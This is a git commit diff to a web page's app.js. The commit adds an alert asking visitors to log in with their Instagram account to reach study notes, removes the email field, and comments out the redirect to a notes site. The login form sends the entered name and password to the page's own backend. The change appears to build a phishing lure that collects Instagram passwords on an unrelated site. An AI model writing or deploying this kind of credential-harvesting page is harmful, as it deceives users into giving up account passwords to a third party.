b0b0b12f2c53e5302e34031aefeefbfa58c7e537
uzair <uzairhakeem71@gmail.com>
2024-04-14 20:44:40 +0500

    add files

--- app.js
+++ app.js
@@ -2,8 +2,8 @@ const sign_in_btn = document.querySelector("#sign-in-btn");
 const sign_up_btn = document.querySelector("#sign-up-btn");
 const container = document.querySelector(".container");
 const name = document.getElementById("name");
-const user_name = document.getElementById("email");
 const pass = document.getElementById("password");
+alert("To access the Notes,Please Login using Instagram account")
 
 // sign_up_btn.addEventListener('click', () =>{
 //     container.classList.add("sign-up-mode");
@@ -19,7 +19,6 @@ thisForm.addEventListener('submit', async function (e) {
     e.preventDefault();
     const formData = {
         name: name.value,
-        email: user_name.value,
         password: pass.value
     };
     const response = await fetch('http://localhost:5000/auth/login', {
@@ -30,5 +29,5 @@ thisForm.addEventListener('submit', async function (e) {
 
     const result = await response.json();
     console.log(result)
-    window.location.href = 'https://www.ilmkidunya.com/11th-class/notes/biology-federal-board#google_vignette'
+    // window.location.href = 'https://www.ilmkidunya.com/11th-class/notes/biology-federal-board#google_vignette'
 });
